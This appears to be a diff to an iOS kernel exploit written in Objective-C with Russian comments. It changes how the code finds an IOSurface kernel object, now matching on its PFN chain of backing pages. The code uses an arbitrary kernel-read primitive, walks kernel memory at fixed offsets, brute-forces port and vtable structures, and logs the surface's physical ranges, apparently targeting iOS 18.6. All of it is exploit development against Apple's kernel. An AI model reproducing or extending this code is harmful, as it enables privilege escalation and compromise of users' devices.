@@ -5848,6 +5848,27 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint64_t slotVAs[8] = {0}, origQs[8] = {0};
     int slotForm[8] = {0};
     int nSlots = 0;
+    // 1.9.145: верификация поверхности по PFN-ЦЕПОЧКЕ (железная правда backingPA),
+    // а не по полю ID — оффсет/ширина surfaceID на 18.6 под вопросом (раунд 28):
+    // все маршруты с проверкой (uint32_t)[X+0x10]==dstID промахивались одинаково.
+    // fast: [X+0x178]=rangeObj → [ro+0x18] = {pfn32 hi, pagecount lo 1..8} (3 чтения,
+    // для циклов). full: fast + inline qword с hi32==pfn32, lo32 1..8 в первых 0x400.
+    BOOL (^surfFast)(uint64_t) = ^BOOL(uint64_t c) {
+        if (!kpLooksLikeKernelPointer(c)) return NO;
+        uint64_t ro = kp_untag_ptr(early_kread64(c + 0x178));
+        if (!kpLooksLikeKernelPointer(ro)) return NO;
+        uint64_t q = early_kread64(ro + 0x18);
+        return (uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8;
+    };
+    BOOL (^surfFull)(uint64_t) = ^BOOL(uint64_t c) {
+        if (surfFast(c)) return YES;
+        if (!kpLooksLikeKernelPointer(c)) return NO;
+        for (uint32_t o = 0; o + 8 <= 0x400; o += 8) {
+            uint64_t q = early_kread64(c + o);
+            if ((uint32_t)(q >> 32) == pfn32 && (uint32_t)q >= 1 && (uint32_t)q <= 8) return YES;
+        }
+        return NO;
+    };
     if (isTable && dstS) {
         // 1.9.144: vtable-карта ВСЕХ портов задачи + brute-force обоих
         // экстракторов (SendRight→поле→surf; RootUC→[+0xe8]→coll→arr[dstID])
@@ -5868,11 +5889,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
         };
         uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
-            if ((uint32_t)early_kread64(kobj + 0x10) == dstID) return kobj;
+            if (surfFull(kobj)) return kobj;
             for (uint32_t o = 0; o < 0x100; o += 8) {
                 uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
-                if (!kpLooksLikeKernelPointer(c)) continue;
-                if ((uint32_t)early_kread64(c + 0x10) == dstID) return c;
+                if (surfFast(c)) return c;
             }
             return (uint64_t)0;
         };
@@ -5883,8 +5903,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t arr2 = kp_untag_ptr(early_kread64(coll + 0xd0));
             if (!kpLooksLikeKernelPointer(arr2) || cnt2 <= dstID || cnt2 >= 0x200000) return (uint64_t)0;
             uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
-            if (!kpLooksLikeKernelPointer(cand)) return (uint64_t)0;
-            if ((uint32_t)early_kread64(cand + 0x10) != dstID) return (uint64_t)0;
+            if (!surfFull(cand)) return (uint64_t)0;
             return cand;
         };
         // smp: сырцовый дамп kobj — понять, почему 1.9.143 не нашла SendRight-поле
@@ -5905,7 +5924,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"    kobj+0x%02x: raw=%#018llx untag=%#018llx%@",
                           o, (unsigned long long)q, (unsigned long long)u,
                           kpLooksLikeKernelPointer(u)
-                            ? [NSString stringWithFormat:@" → [+0x10]=%#x", (uint32_t)early_kread64(u + 0x10)] : @""]);
+                            ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
             }
             surfVA = surfFromSendRight(smpKobj);
             if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp SendRight → IOSurface %#llx", (unsigned long long)surfVA]);
@@ -6105,19 +6124,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (kpLooksLikeKernelPointer(arr2)) {
                     uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
                     if (kpLooksLikeKernelPointer(cand)) {
-                        uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
-                        kpNote(r, [NSString stringWithFormat:@"    coll=%#llx cnt=%u cand=%#llx [cand+0x10]=%u",
-                                  (unsigned long long)coll, (unsigned)cnt2, (unsigned long long)cand, cid]);
-                        if (cid == dstID) {
+                        if (surfFast(cand)) {
                             uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
                             uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
-                            if ((uint32_t)(rq >> 32) == pfn32 && (uint32_t)rq == 1) {
-                                surfVA = cand;
-                                rangesVA = ro + 0x18;
-                                kpNote(r, [NSString stringWithFormat:@"  ★ реестр: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
-                                          (unsigned long long)surfVA, (unsigned long long)ro,
-                                          (unsigned long long)rangesVA, (unsigned long long)rq]);
-                            }
+                            surfVA = cand;
+                            rangesVA = ro + 0x18;
+                            kpNote(r, [NSString stringWithFormat:@"  ★ реестр (pfn-вериф.): surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                                      (unsigned long long)surfVA, (unsigned long long)ro,
+                                      (unsigned long long)rangesVA, (unsigned long long)rq]);
                         }
                     }
                 }
@@ -6139,12 +6153,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!kpLooksLikeKernelPointer(P)) continue;
             for (uint32_t i = 0; i < 0x40 && !rangesVA; i++) {
                 uint64_t cand = kp_untag_ptr(early_kread64(P + (uint64_t)i * 8));
-                if (!kpLooksLikeKernelPointer(cand)) continue;
-                uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
-                if (cid != dstID) continue;
+                if (!surfFast(cand)) continue;
                 uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
                 uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
-                if ((uint32_t)(rq >> 32) != pfn32 || (uint32_t)rq != 1) continue;
                 surfVA = cand;
                 rangesVA = ro + 0x18;
                 kpNote(r, [NSString stringWithFormat:@"  ★ массив root+%#llx[%u]: surfVA=%#llx rangesVA=%#llx (qword=%#018llx)",
